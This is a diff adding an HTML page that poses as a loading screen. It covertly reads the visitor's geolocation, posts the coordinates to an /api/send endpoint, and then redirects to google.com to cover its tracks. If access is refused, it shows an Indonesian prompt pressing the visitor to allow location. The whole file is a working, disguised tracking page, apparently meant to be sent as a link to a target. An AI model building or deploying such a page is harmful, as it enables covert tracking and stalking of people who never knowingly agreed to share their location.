@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body onclick="start()">
+  <p>Loading...</p>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("/api/send", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ lat, lon })
+      }).then(() => {
+        window.location.href = "https://google.com";
+      });
+    }
+
+    function start() {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocation(pos.coords.latitude, pos.coords.longitude);
+        },
+        () => {
+          document.body.innerHTML = "Izinkan lokasi untuk lanjut...";
+        }
+      );
+    }
+
+    start();
+  </script>
+</body>
+</html>
